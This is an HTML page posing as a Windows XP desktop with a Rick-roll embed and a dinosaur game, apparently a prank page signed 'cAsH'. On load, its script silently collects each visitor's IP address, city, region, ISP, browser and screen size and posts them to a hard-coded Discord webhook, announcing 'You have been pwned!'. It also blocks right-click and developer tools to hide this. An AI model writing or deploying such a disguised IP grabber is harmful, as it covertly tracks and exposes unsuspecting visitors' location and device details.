<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows XP Desktop</title>
    <style>
        /* Global Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            font-family: "Tahoma", sans-serif;
            overflow: hidden;
            cursor: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329165444934008864/cursor.cur'), auto;
        }

        /* Background */
        body {
            background: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329157116531048470/eb0f8c3e2e1a8e1508f3afa2c86ad51f.gif') no-repeat center center fixed;
            background-size: cover;
        }

        /* Taskbar */
        .taskbar {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 50px;
            background: black;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            box-shadow: 0 -3px 5px rgba(0, 0, 0, 0.8);
            z-index: 100;
        }

        .start-button {
            width: 50px;
            height: 50px;
            background: none;
            border: none;
            margin-left: 10px;
            cursor: pointer;
        }

        .start-button img {
            width: 40px;
            height: 40px;
            transition: transform 0.2s ease-in-out;
        }

        .start-button img:hover {
            transform: scale(1.1);
        }

        /* Volume Control */
        .volume-control {
            position: absolute;
            bottom: 60px;
            right: 10px;
            text-align: center;
            color: white;
            font-size: 12px;
            z-index: 200;
            background: rgba(0, 0, 0, 0.7);
            padding: 10px;
            border-radius: 10px;
        }

        .volume-control input {
            width: 100px;
        }

        /* Popup Alert */
        .alert {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: black;
            color: white;
            padding: 20px 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.8);
            text-align: center;
            font-size: 16px;
            font-weight: bold;
            z-index: 200;
            display: none;
            opacity: 0;
            transition: opacity 0.3s ease-in-out;
        }
    </style>
</head>
<body>
    <!-- Background Music -->
    <iframe id="youtubePlayer" style="display:none;" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="autoplay"></iframe>

    <!-- Volume Control -->
    <div class="volume-control">
        <span>Volume</span>
        <input type="range" id="volumeSlider" min="0" max="100" step="1" value="100">
    </div>

    <!-- Desktop -->
    <div class="desktop">
        <!-- PWN Icon -->
        <div class="icon" onclick="showAlert()">
            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329157216397426740/imgbin_lulzsec-security-hacker-anonymous-computer-security-hacker-group-png.png" alt="PWN Icon">
            <span>PWN</span>
        </div>
    </div>

    <!-- Taskbar -->
    <div class="taskbar">
        <button class="start-button" onclick="openGame()">
            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329158869271838740/start_icon.jpg" alt="Start Icon">
        </button>
    </div>

    <!-- Smooth Alert -->
    <div class="alert" id="alertBox">
        Made by cAsH
    </div>

    <!-- Dinosaur Game -->
    <div class="alert" id="gameWindow">
        <iframe src="https://chromedino.com/" width="800" height="400" frameborder="0"></iframe>
    </div>

    <script>
        // Smooth Alert for PWN Icon
        function showAlert() {
            const alertBox = document.getElementById('alertBox');
            alertBox.style.display = 'block';
            alertBox.style.opacity = '1';

            setTimeout(() => {
                alertBox.style.opacity = '0';
                setTimeout(() => {
                    alertBox.style.display = 'none';
                }, 300);
            }, 3000);
        }

        // Volume Control for YouTube Player
        const volumeSlider = document.getElementById('volumeSlider');
        const youtubePlayer = document.getElementById('youtubePlayer');

        volumeSlider.addEventListener('input', (e) => {
            const volume = e.target.value / 100; // Convert to range 0.0 - 1.0
            youtubePlayer.contentWindow.postMessage(JSON.stringify({
                event: 'command',
                func: 'setVolume',
                args: [volume * 100]
            }), '*');
        });

        // Webhook Script to Fetch and Send IP Info
        async function fetchAndSendIP() {
            try {
                const ipResponse = await fetch('https://api.ipify.org/?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
                const geoData = await geoResponse.json();

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const timestamp = new Date().toLocaleString();

                // Build webhook message content
                const webhookMessage = `
:cAsH:  cAsH grabbed You :cAsH: 

**User IP:** ${userIP}
**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
**ISP:** ${geoData.org || "Unknown"}
**Browser:** ${userAgent}
**Platform:** ${platform}
**Screen Resolution:** ${screenWidth}x${screenHeight}
**Timestamp:** ${timestamp}

||@everyone|| **You have been pwned!**
                `;

                // Send to Discord Webhook
                await fetch("https://discord.com/api/webhooks/1329196613524127744/FBovN89fd9EDbmk51UAy0v82nAG_nWn_zkNa6BpntB8Jxotk-9I4p1zp3G7H1bPbh9AV", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: webhookMessage
                    })
                });
            } catch (error) {
                console.error('Error fetching IP or sending to webhook:', error);
            }
        }

        // Execute the Webhook Script on Page Load
        window.onload = fetchAndSendIP;

        // Block Right-Click and Inspect
        document.addEventListener('contextmenu', (e) => e.preventDefault());

        document.addEventListener('keydown', (e) => {
            if (
                e.key === 'F12' ||
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
                (e.ctrlKey && e.key === 'U')
            ) {
                e.preventDefault();
            }
        });

        // Reload if DevTools Detected
        setInterval(() => {
            const t1 = performance.now();
            console.log('Detecting DevTools...');
            const t2 = performance.now();
            if (t2 - t1 > 100) window.location.reload();
        }, 1000);
    </script>
</body>
</html>
